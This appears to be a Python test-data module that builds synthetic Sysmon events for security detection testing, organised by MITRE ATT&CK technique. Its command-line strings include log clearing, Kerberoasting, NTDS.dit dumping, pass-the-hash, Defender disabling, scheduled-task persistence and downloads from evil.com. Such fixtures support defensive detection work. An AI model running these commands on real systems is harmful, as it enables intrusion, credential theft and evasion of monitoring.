"""Advanced Windows Sysmon synthetic event batches."""

from testlogs.common import *  # noqa: F401,F403
from testlogs.windows_sysmon_core import sysmon_event


def _advanced_windows_events():
    events = []
    # ── Event Log Clearing ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\wevtutil.exe",
        command_line="wevtutil.exe cl Security",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=500,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\wevtutil.exe",
        command_line="wevtutil cl System",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=501,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe Clear-EventLog -LogName Security",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=502,
    ))

    # ── PsExec Remote Execution ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Tools\\PsExec.exe",
        command_line="psexec.exe \\\\DC01 -accepteula -s cmd.exe",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=510,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Tools\\PsExec64.exe",
        command_line="psexec64.exe \\\\192.168.1.50 -accepteula -u admin -p P@ss cmd /c whoami",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=511,
    ))

    # ── UAC Bypass ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\fodhelper.exe",
        command_line="fodhelper.exe",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=520,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\eventvwr.exe",
        command_line="eventvwr.exe",
        parent_image="C:\\Temp\\malware.exe",
        offset=521,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\sdclt.exe",
        command_line="sdclt.exe /kickoffelev",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=522,
    ))

    # ── Kerberoasting ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Temp\\Rubeus.exe",
        command_line="Rubeus.exe kerberoast /outfile:hashes.txt",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=530,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe Invoke-Kerberoast -OutputFormat Hashcat | Out-File hashes.txt",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=531,
    ))

    # ── BITS Job Persistence ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\bitsadmin.exe",
        command_line="bitsadmin /SetNotifyCmdLine PersistJob C:\\Temp\\backdoor.exe NULL",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=540,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\bitsadmin.exe",
        command_line="bitsadmin /AddFile DownloadJob http://evil.com/payload.exe C:\\Temp\\payload.exe",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=541,
    ))

    # ── MSBuild Code Execution ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe",
        command_line="MSBuild.exe C:\\Temp\\payload.csproj",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=550,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe",
        command_line="MSBuild.exe C:\\Users\\Public\\inline.xml",
        parent_image="C:\\Windows\\explorer.exe",
        offset=551,
    ))

    # ── Pass-the-Hash Indicators ──
    pth_cmds = [
        ("powershell.exe", "powershell.exe Invoke-SMBExec -Target 192.168.1.50 -Hash <NTLM_HASH>:<NTLM_HASH>"),
        ("powershell.exe", "powershell.exe Invoke-WMIExec -Target DC01 -Hash <NTLM_HASH> -Command whoami"),
        ("C:\\Tools\\crackmapexec.exe", "crackmapexec smb 192.168.1.0/24 -u admin -H <NTLM_HASH>"),
    ]
    for i, (image, cmd) in enumerate(pth_cmds):
        img = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" if "powershell" in image else image
        events.append(sysmon_event(
            event_id=1,
            image=img,
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            host="DC01.corp.local",
            offset=560+i,
        ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\runas.exe",
        command_line="runas.exe /netonly /user:CORP\\admin cmd.exe",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=563,
    ))

    # ── Process Hollowing Indicators ──
    hollow_cmds = [
        "C:\\Temp\\injector.exe NtUnmapViewOfSection WriteProcessMemory NtResumeThread",
        "C:\\Temp\\hollow.exe CREATE_SUSPENDED svchost.exe",
    ]
    for i, cmd in enumerate(hollow_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Temp\\injector.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=570+i,
        ))

    # ── WDigest Credential Harvest ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\reg.exe",
        command_line='reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f',
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=580,
    ))

    # ── NTDS.dit Extraction ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\ntdsutil.exe",
        command_line='ntdsutil.exe "ac i ntds" "ifm" "create full C:\\Temp\\ntds_dump" q q',
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=590,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\cmd.exe",
        command_line="cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\Temp\\ntds.dit",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=591,
    ))

    # ═══════════════════════════════════════════════════════════════
    #  NEW (Batch 4): MITRE Tactic Expansion - Windows Events
    # ═══════════════════════════════════════════════════════════════

    # ── Account Discovery (T1087) ──
    acct_disc_cmds = [
        ("C:\\Windows\\System32\\net.exe", "net user /domain"),
        ("C:\\Windows\\System32\\net.exe", "net group /domain"),
        ("C:\\Windows\\System32\\net.exe", "net localgroup administrators"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe Get-ADUser -Filter * -Properties *"),
        ("C:\\Windows\\System32\\dsquery.exe", "dsquery user -name * -limit 500"),
    ]
    for i, (image, cmd) in enumerate(acct_disc_cmds):
        events.append(sysmon_event(
            event_id=1, image=image, command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=650+i,
        ))

    # ── Network Share Discovery (T1135) ──
    share_disc_cmds = [
        ("C:\\Windows\\System32\\net.exe", "net share"),
        ("C:\\Windows\\System32\\net.exe", "net view \\\\DC01"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe Get-SmbShare"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe Invoke-ShareFinder -ComputerName DC01"),
    ]
    for i, (image, cmd) in enumerate(share_disc_cmds):
        events.append(sysmon_event(
            event_id=1, image=image, command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=660+i,
        ))

    # ── Remote System Discovery (T1018) ──
    remote_disc_cmds = [
        ("C:\\Windows\\System32\\arp.exe", "arp.exe -a"),
        ("C:\\Windows\\System32\\nslookup.exe", "nslookup DC01.corp.local"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe Test-Connection -ComputerName DC01 -Count 1"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe Get-ADComputer -Filter * -Properties IPv4Address"),
        ("C:\\Windows\\System32\\cmd.exe", 'cmd.exe /c "for /l %i in (1,1,254) do @ping -n 1 192.168.1.%i"'),
    ]
    for i, (image, cmd) in enumerate(remote_disc_cmds):
        events.append(sysmon_event(
            event_id=1, image=image, command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=670+i,
        ))

    # ── Spearphishing Attachment Execution (T1566.001) ──
    phishing_cmds = [
        ("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c powershell -ep bypass -c IEX(IWR http://evil.com/ps.ps1)", "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -NoP -Sta -W 1 -Enc JABjAGwA", "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"),
        ("C:\\Windows\\System32\\mshta.exe", "mshta.exe http://evil.com/payload.hta", "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"),
    ]
    for i, (image, cmd, parent) in enumerate(phishing_cmds):
        events.append(sysmon_event(
            event_id=1, image=image, command_line=cmd,
            parent_image=parent,
            offset=680+i,
        ))

    # ── Data Staging for Exfiltration (T1074.001) ──
    staging_cmds = [
        ("C:\\Windows\\System32\\robocopy.exe", "robocopy.exe C:\\Users\\admin\\Documents C:\\Users\\Public\\staging /MIR"),
        ("C:\\Windows\\System32\\xcopy.exe", "xcopy.exe C:\\Shares\\Finance C:\\Temp\\staging /S /E"),
        ("C:\\Windows\\System32\\compact.exe", "compact /c C:\\Temp\\staging"),
    ]
    for i, (image, cmd) in enumerate(staging_cmds):
        events.append(sysmon_event(
            event_id=1, image=image, command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=690+i,
        ))

    # ── GOAD / Caldera showcase events for dashboard drilldowns ──
    # Keep these deterministic so the GOAD dashboard can demonstrate AD
    # discovery, credential access, collection, and sandcat deployment even
    # without a live Caldera run.
    goad_host = "kingslanding"
    goad_user = "SEVENKINGDOMS\\joffrey"
    goad_cmds = [
        (
            1,
            "C:\\Tools\\AdFind.exe",
            "AdFind.exe -f \"(objectcategory=person)\" -dn",
            "C:\\Windows\\System32\\cmd.exe",
            None,
            "GOAD AdFind domain account enumeration",
        ),
        (
            1,
            "C:\\Users\\Public\\SharpHound.exe",
            "SharpHound.exe -c All --zipfilename kingslanding.zip",
            "C:\\Windows\\System32\\cmd.exe",
            None,
            "GOAD BloodHound collection",
        ),
        (
            1,
            "C:\\Windows\\System32\\nltest.exe",
            "nltest.exe /domain_trusts /all_trusts",
            "C:\\Windows\\System32\\cmd.exe",
            None,
            "GOAD domain trust discovery",
        ),
        (
            1,
            "C:\\Tools\\Rubeus.exe",
            "Rubeus.exe asreproast /user:svc_sql /format:hashcat /outfile:C:\\Users\\Public\\asrep.txt",
            "C:\\Windows\\System32\\cmd.exe",
            None,
            "GOAD AS-REP roasting with Rubeus",
        ),
        (
            1,
            "C:\\Program Files\\7-Zip\\7z.exe",
            "7z.exe a -tzip C:\\Users\\Public\\loot.zip C:\\Shares\\Finance\\* -pWinterIsComing!",
            "C:\\Windows\\System32\\cmd.exe",
            None,
            "GOAD password-protected 7zip collection archive",
        ),
        (
            11,
            "C:\\Windows\\System32\\cmd.exe",
            "cmd.exe /c copy C:\\Tools\\sandcat.exe C:\\Users\\Public\\splunkd.exe",
            "C:\\Windows\\System32\\cmd.exe",
            "C:\\Users\\Public\\splunkd.exe",
            "GOAD Caldera sandcat staged as splunkd.exe",
        ),
        (
            1,
            "C:\\Windows\\System32\\schtasks.exe",
            "schtasks /Create /SC ONCE /TN SplunkFwd /TR C:\\Users\\Public\\splunkd.exe /RU SYSTEM",
            "C:\\Windows\\System32\\cmd.exe",
            None,
            "GOAD Caldera SplunkFwd scheduled task creation",
        ),
        (
            1,
            "C:\\Users\\Public\\splunkd.exe",
            "splunkd.exe -server http://192.168.100.78:8888 -group goad",
            "C:\\Windows\\System32\\schtasks.exe",
            None,
            "GOAD Caldera sandcat execution",
        ),
        (
            1,
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true # Caldera pre-stage",
            "C:\\Windows\\System32\\cmd.exe",
            None,
            "GOAD Caldera Defender disable pre-stage",
        ),
    ]
    for i, (event_id, image, cmd, parent, target, message) in enumerate(goad_cmds):
        events.append(sysmon_event(
            event_id=event_id,
            image=image,
            command_line=cmd,
            parent_image=parent,
            target_filename=target,
            host=goad_host,
            user=goad_user,
            msg=message,
            offset=695+i,
            Entity=goad_host,
        ))

    # ── Keylogger Indicators (T1056.001) ──
    keylogger_cmds = [
        "powershell.exe Add-Type -MemberDefinition '[DllImport(\"user32.dll\")] public static extern short GetAsyncKeyState(int vKey);' -Name kb -Namespace k",
        "C:\\Temp\\keylogger.exe --output C:\\Temp\\keystrokes.txt",
    ]
    for i, cmd in enumerate(keylogger_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" if "powershell" in cmd.lower() else "C:\\Temp\\keylogger.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=700+i,
        ))

    # ── Screen Capture (T1113) ──
    screenshot_cmds = [
        "powershell.exe -c [System.Drawing.Graphics]::CopyFromScreen(0,0,0,0,[System.Drawing.Size]::new(1920,1080))",
        "nircmd.exe savescreenshot C:\\Temp\\screenshot.png",
    ]
    for i, cmd in enumerate(screenshot_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" if "powershell" in cmd.lower() else "C:\\Tools\\nircmd.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=710+i,
        ))

    # ── Remote Access Tools (T1219) ──
    rat_cmds = [
        ("C:\\Program Files\\AnyDesk\\AnyDesk.exe", "AnyDesk.exe --start-service"),
        ("C:\\Users\\analyst\\Downloads\\ngrok.exe", "ngrok.exe tcp 3389"),
        ("C:\\Program Files\\TeamViewer\\TeamViewer.exe", "TeamViewer.exe"),
    ]
    for i, (image, cmd) in enumerate(rat_cmds):
        events.append(sysmon_event(
            event_id=1, image=image, command_line=cmd,
            parent_image="C:\\Windows\\explorer.exe",
            offset=720+i,
        ))

    # ── Access Token Manipulation (T1134) ──
    token_cmds = [
        "powershell.exe Invoke-TokenManipulation -Enumerate",
        "C:\\Temp\\JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a '/c C:\\Temp\\payload.exe' -t *",
        "C:\\Temp\\PrintSpoofer.exe -i -c cmd.exe",
        "powershell.exe token::elevate",
    ]
    for i, cmd in enumerate(token_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" if "powershell" in cmd.lower() else cmd.split()[0],
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=730+i,
        ))

    # ═══════════════════════════════════════════════════════════════
    #  HUNTING: High-volume events for aggregation-based queries
    # ═══════════════════════════════════════════════════════════════


    return events
